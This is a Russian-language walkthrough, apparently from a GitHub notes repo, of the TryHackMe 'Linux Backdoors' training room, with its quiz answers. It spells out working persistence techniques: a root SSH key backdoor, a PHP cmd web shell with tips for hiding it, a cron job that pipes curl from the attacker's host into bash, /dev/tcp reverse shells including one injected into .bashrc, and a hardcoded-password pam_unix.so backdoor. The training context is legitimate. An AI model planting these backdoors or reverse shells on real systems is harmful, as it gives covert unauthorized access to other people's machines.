[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux Backdoors](https://tryhackme.com/r/room/linuxbackdoors) 

Всего 6 заданий:
## Задание 1
Привет всем!

Эта комната посвящена изучению распространенных методов бэкдоров Linux ! Бэкдор — это просто то, что мы можем 
сделать, чтобы обеспечить себе постоянный доступ к машине.  

Таким образом, даже если машина будет перезагружена, выключена или что-то еще, мы все равно сможем получить к ней доступ. 

Это не настоящие уязвимости, а просто способы сохранить доступ к цели :)

Чтобы воссоздать все бэкдор-техники, показанные в этой комнате, вы можете просто попробовать их все на своей машине 
или использовать «THM ATTACK BOX», поскольку он 

безопаснее, и неважно, если вы что-то испортите.

Удачного взлома!

### Ответьте на вопросы ниже
Вы понимаете, что такое бэкдор?
```commandline
Ответ не нужен
```

## Задание 2
Первый бэкдор, который мы рассмотрим, это: бэкдор SSH.

Бэкдор ssh по сути заключается в том, чтобы оставить наши ключи ssh в домашнем каталоге какого-то пользователя. 
Обычно это пользователь root, так как он имеет наивысшие привилегии.  

Итак, давайте сгенерируем набор ключей SSH с помощью ssh-keygen!

Для этого просто выполните команду ssh-keygen, как показано ниже!



Теперь, когда у нас есть 2 ключа. 1 закрытый ключ и 1 открытый ключ, мы можем  перейти  в /root/.ssh и оставить там 
наш открытый ключ. Не забудьте переименовать открытый ключ в : authorized_keys 

Если каталог .ssh отсутствует, вы всегда можете создать его с помощью этой команды: "mkdir .ssh"

Теперь, когда мы покинули наш бэкдор, мы можем просто войти в систему как root!

Прежде чем сделать это, предоставьте закрытому ключу необходимые права доступа с помощью: chmod 600 id_rsa.

Это необходимо, поскольку если мы этого не сделаем, ssh будет жаловаться на то, что разрешения на доступ к ключу 
недостаточно надежны, и, скорее всего, не позволит нам его использовать. 

После предоставления ключу правильных прав доступа мы можем выполнить команду: «ssh -i id_rsa root@ip», чтобы войти 
в нужную нам машину! 

Что следует отметить относительно этого бэкдора:

 Этот бэкдор вообще не скрыт. Любой с соответствующими правами мог бы удалить наш открытый ключ ssh или файл 
 authorized_keys полностью. 


### Ответьте на вопросы ниже
В какой директории мы размещаем наши ключи?
```commandline
.ssh
```
Какой флаг в ssh мы используем, чтобы показать наш закрытый ключ?
```commandline
-i
```

## Задание 3
Давайте теперь перейдем ко второму бэкдору: PHP- бэкдоры!

Если вы получили root-доступ на хосте Linux , вы, скорее всего, будете искать учетные данные и/или любую полезную 
информацию в корневом каталоге веб-сайта. 

Корневой каталог обычно находится в: `/var/www/html`

Вам нужно знать, что все, что вы оставите в /var/www/html, будет доступно для использования в браузере каждого.

Теперь, когда вы это знаете, вы можете попробовать создать php-файл с любым именем и поместить в него этот фрагмент кода:
```commandline
<?php 
    если (isset($_REQUEST['cmd'])) { 
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; 
    } 
?>
```

Этот код просто принимает параметр «cmd» и выполняет все, что передается этому параметру.
Обратите внимание, что мы используем: "$_REQUEST['cmd'])", что означает, что вы можете передать этот параметр либо в 
данных GET, либо в данных POST. 
Теперь, когда файл сохранен и готов, мы можем попытаться выполнить запрос к нему.
Если вы оставили файл в `/var/www/html/shell.php` | Вы должны иметь возможность получить к нему прямой доступ, 
используя: http://ip/shell.php
Если вы оставили оболочку где-то в другом месте, посмотрите, в каком каталоге она находится, а затем попробуйте 
получить к ней доступ, выполнив следующие действия: http://ip/somedirectory/shell.php 
Вот несколько способов, с помощью которых мы могли бы сделать этот бэкдор более скрытным:
1. Попробуйте добавить этот фрагмент кода в уже существующие файлы php в /var/www/html. Добавление его ближе к 
   середине файлов определенно сделает наши вредоносные действия немного более скрытными. 
2. Измените параметр "cmd" на что-то другое... на самом деле, на что угодно... просто измените его на что-то не 
   такое распространенное. "Cmd" действительно распространен и уже очень хорошо известен в хакерском сообществе. 

### Ответьте на вопросы ниже
Вы понимаете, что такое PHP Backdoor
```commandline
Ответ не нужен
```

## Задание 4
Давайте теперь перейдем к третьему методу обхода!

Этот бэкдор заключается в создании cronjob!

Если вы посмотрите на свой файл cronjobs, который называется `/etc/cronjob`, вы увидите что-то вроде этого:



Здесь представлены все задачи, которые запланированы к запуску в определенное время на вашем компьютере.

Получив root-доступ на любом хосте, вы можете добавить любую запланированную задачу. Вы даже можете просто настроить 
задачу, где каждую минуту вам будет отправляться обратный шелл. Что мы и собираемся сделать. 

Обратите внимание на две буквы в верхней части заданий: «м и ч».

Это буквы, которые указывают, должна ли задача запускаться каждый час или каждую минуту.

В приведенном выше примере вы можете видеть символ «*» под «h». Это означает, что следующая задача будет запускаться 
каждый час. 

Теперь давайте перейдем к нашему черному ходу!

Добавьте эту строку в наш файл cronjob:

`* * * * * root curl http://<yourip>:8080/shell | bash`

Обратите внимание, что мы добавили ко всему символ звездочки "*". Это означает, что наша задача будет выполняться 
каждую минуту, каждый час, каждый день и т. д. 

Сначала мы используем «curl» для загрузки файла, а затем передаем его в «bash».

Содержимое файла «shell», который мы используем, простое:
```commandline
-------------------------------------------------

#!/bin/bash

bash -i >& /dev/tcp/ip/порт 0>&1

--------------------------------------------------

```

Нам пришлось бы запустить HTTP- сервер, обслуживающий нашу оболочку.

Этого можно добиться, запустив: "python3 -m http.server 8080"

Как только наша оболочка будет загружена, она будет запущена «bash», и мы получим оболочку!

*Не забудьте прослушать указанный вами порт с помощью "nc -nvlp <port>"*

Обратите внимание, что этот бэкдор на самом деле не скрыт, поскольку каждый может его увидеть, просто заглянув в /etc/crontab.

### Ответьте на вопросы ниже
Что означает буква «m» в cronjobs?
```commandline
minute
```
Что означает буква «h» в cronjobs?
```commandline
hour
```

## Задание 5
Давайте теперь перейдем к бэкдору ".bashrc"!

Если у пользователя в качестве оболочки входа используется bash, то при запуске интерактивного сеанса выполняется 
файл «.bashrc» в его домашнем каталоге. 

Поэтому, если вы знаете пользователей, которые входят в свою систему довольно часто, вы можете просто запустить эту 
команду, чтобы включить вашу обратную оболочку в их «.bashrc». 
`echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc`
Важно всегда держать ваш прослушиватель nc готовым, так как вы не знаете, когда ваш пользователь войдет в систему.
Эта атака очень коварна, поскольку никто на самом деле не думает проверять свой файл «.bashrc».
С другой стороны, вы не можете точно знать, войдет ли кто-либо из пользователей в свою систему, поэтому вам 
действительно придется ждать довольно долго. 

### Ответьте на вопросы ниже
Вы понимаете, что такое бэкдор-техника «.bashrc»!

```commandline
Ответ не нужен
```
### Задание 6
Давайте теперь перейдем к пятой и последней задней двери этой комнаты!

Помимо пяти показанных в этой комнате бэкдоров, доступно гораздо больше!

Хороший ресурс, который я нашел действительно полезным при создании этой комнаты: ссылка

Итак, теперь перейдем к пятому бэкдору.

Бэкдор, который мы собираемся рассмотреть, это: бэкдор pam_unix.so!

Если вы не знаете, что такое файл «pam_unix.so», то это просто один из многих файлов в Linux , отвечающих за аутентификацию.

Итак, давайте на самом деле зайдем в черный ход!



Как видно здесь, файл «pam_unix.so» использует функцию «unix_verify_password» для проверки предоставленного пользователем пароля.

Теперь давайте посмотрим на этот скриншот:



Мы видим, что мы добавили новую строку в наш код: «if (strcmp(p, «0xMitsurugi») != 0 )»

Хорошо, если этот код поначалу покажется вам запутанным, не волнуйтесь!

Мы разберемся вместе!

Итак, сначала нам нужно узнать, что делает функция «strcmp».

Эта функция по сути сравнивает 2 строки.

На снимке экрана выше мы сравниваем переменную «p» и строку «0xMitsurugi».

Переменная "p" обозначает пароль, предоставленный пользователем. Другими словами, пароль, предоставленный пользователем.

Вы также можете увидеть "!=0" в конце оператора. Это означает "если не удалось". Таким образом, если переменная "p" (указанный пользователем пароль) и строка "0xMitsurugi" НЕ совпадают... будет использована функция "unix_verify_password".

Но с другой стороны, если переменная "p" (пароль, предоставленный пользователем) и строка "0xMitsurugi" одинаковы, аутентификация прошла успешно. Мы отмечаем успех с помощью "PAM_SUCCESS;"

Таким образом, этот бэкдор по сути заключается в добавлении вашего собственного пароля к «pam_unix.so».

Поскольку вы знаете пароль, который вы добавили в файл, вы всегда сможете пройти аутентификацию с этим паролем, пока он не будет удален из «pam_unix.so».

Итак, давайте сделаем небольшой обзор:

Допустим, пользователь вводит пароль "password123" и пытается пройти аутентификацию. Мы сравним его пароль (password123) со строкой "0xMitsurugi".

Если эти две строки совпадают, аутентификация прошла успешно. Но эти 2 строки не совпадают, поэтому аутентификация не будет

успешно и будет полагаться на функцию "unix_verify_password". При использовании функции "unix_verify_password" для аутентификации функция принимает

пароль пользователя из "/etc/shadow" и сравнивает его с предоставленным паролем пользователя. Вот как должна работать предполагаемая система аутентификации.

Однако этот метод называется бэкдором, поскольку вы добавляете свой собственный пароль, который можете использовать всегда, пока его никто не вынесет из «pam_unix.so».

Эту уязвимость действительно трудно обнаружить, поскольку, опять же, никто не задумывается о том, чтобы заглядывать в такие файлы.

Поскольку этот метод постепенно становится все более популярным, вы, вероятно, не сможете делать это каждый раз, поскольку все постепенно, но верно поймут, как защитить себя.

Использованный ресурс: http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html

Вот репозиторий GitHub, содержащий скрипт, автоматизирующий процесс создания бэкдора: https://github.com/zephrax/linux-pam-backdoor


### Ответьте на вопросы ниже
Я понимаю искусство бэкдоров Linux!
```commandline
Ответ не требуется
```
Закончи комнату!
```commandline
Ответ не требуется
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)